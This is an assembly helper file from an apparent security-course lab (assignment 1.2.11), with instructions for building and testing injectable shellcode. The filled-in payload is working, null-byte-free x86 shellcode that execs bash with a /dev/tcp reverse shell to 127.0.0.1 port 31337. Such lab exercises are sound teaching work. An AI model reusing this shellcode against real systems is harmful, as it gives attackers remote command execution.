/*
  Credit: YiFei Zhu

  This file provides a way to build/run your shellcode as a standalone executable, which can
  be easier to debug than when you have to inject it into the vulnerable program, like you
  must in your final solution.

  This file will NOT be used in grading. Partial credit will NOT be awarded
  based on the contents of this file. It is only to help you work on your final
  solution to 1.2.11

  Assuming this assembly file is called 1.2.11_helper.S

  To build standalone executable:
    $ gcc -DTEST 1.2.11_helper.S -o 1.2.11_helper

    The generated standalone ELF (executable) is 1.2.11_helper. Do whatever you
    need with it to complete 1.2.11
    Ex: check for null bytes:
    $ objdump -d ./1.2.11_helper | awk -v RS= '/<main>:/' | grep ' 00 '

  To build shellcode:
    $ gcc -static -nostartfiles -Wl,--section-start=.text=0x[BASE ADDRESS OF SHELLCODE GOES HERE, WITHOUT THE BRACKETS] 1.2.11_helper.S -o 1.2.11_helper.o
    $ gcc -static -nostartfiles -Wl,--section-start=.text=0xfffecef8 1.2.11_helper.S -o 1.2.11_helper.o
    $ objcopy -j .text -O binary 1.2.11_helper.o 1.2.11_helper

    The generated shellcode in flat binary form is 1.2.11_helper. Do whatever you
    need with it to complete 1.2.11, such as creating a python representation:
    $ python3 -c 'print(repr(open("1.2.11_helper", "rb").read()))'
    or to check for null bytes:
    $ hd 1.2.11_helper | grep ' 00 '
*/

#ifdef TEST
.globl main
main:

// Function prologue, used if built as standalone executable
push %ebp
mov %esp,%ebp
#else
.globl _start
_start:
#endif

// YOUR ASSEMBLY GOES HERE
xor    %eax, %eax

push   %eax # push zero termination
push $0x68736162
push $0x2f2f2f2f
push $0x6e69622f # /bin/bash padded to alignment
mov %esp,%ebx # ebx = str_location

push %eax   #null
push $0x31263e30 # 0>&1

#push $0x20202020
xor %ebp, %ebp
add $0x10101010, %ebp
add $0x10101010, %ebp
push %ebp

push $0x37333331
push $0x332f312e
push $0x302e302e
push $0x3732312f
push $0x7063742f
push $0x7665642f
push $0x263e492d

#push $0x20202020
#xor %ebp, %ebp
#add $0x10101010, %ebp
#add $0x10101010, %ebp
push %ebp

push $0x68736162 #bash

mov %esp, %ebp # ebp = arg2

push %eax   #null
push $0x6368682d # -hhc
mov %esp, %ecx # ecx = arg2

push %eax   #null
push %ebp
push %ecx
push %ebx       #arg0
mov %esp, %ecx

xor   %edx,%edx      # zero edx
push   %ebx      # zero ebx
#mov $11, %eax
xor   %eax,%eax      # avoid vt character
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
inc %eax
int    $0x80

#ifdef TEST
leave
ret

.data
#endif

// YOUR LABELED DATA GOES HERE, LIKE

end:

